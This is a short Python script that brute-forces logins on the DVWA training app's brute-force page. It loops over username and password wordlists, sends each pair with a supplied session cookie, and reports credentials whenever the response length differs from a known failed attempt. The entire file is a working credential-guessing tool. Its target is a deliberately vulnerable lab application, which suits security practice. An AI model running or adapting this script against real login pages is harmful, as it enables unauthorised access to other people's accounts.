import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError


ip = input("Input target ip address : ")
w1 = input("Input your wordlist file for username : ")
w2 = input("Input your wordlist file for password : ")
cookie = input("Input your cookie value : ")

lines1 = open(w1)
lines2 = open(w2)

list1 = []
list2 = []

for line1 in lines1:
    linem1 = line1.strip("\n")
    list1.append(linem1)


for line2 in lines2:
    linem2 = line2.strip("\n")
    list2.append(linem2)




ip_tam = "http://{}/dvwa/vulnerabilities/brute/?username=satleca&password=satleca&Login=Login".format(ip)
req = urllib.request.Request(ip_tam)
req.add_header("Cookie", cookie)
resp = urllib.request.urlopen(req)
html1 = resp.read().decode('utf-8')
datam2 = len(html1)

for i in range(len(list1)):
    for x in range(len(list2)):
        ip_tam = "http://{}/dvwa/vulnerabilities/brute/?username={}&password={}&Login=Login".format(ip,list1[i],list2[x])
        req = urllib.request.Request(ip_tam)
        req.add_header("Cookie",cookie)
        try:
            resp = urllib.request.urlopen(req)
            html = resp.read().decode('utf-8')
            datam = len(html)
            datam = str(datam)
            if datam in str(datam2):
                pass
            else:
                print("\n\nUsername and password found !!! {}:{}\n\n".format(list1[i],list2[x]))

        except HTTPError as e:
            print("Error !!!! ", e.code)
            
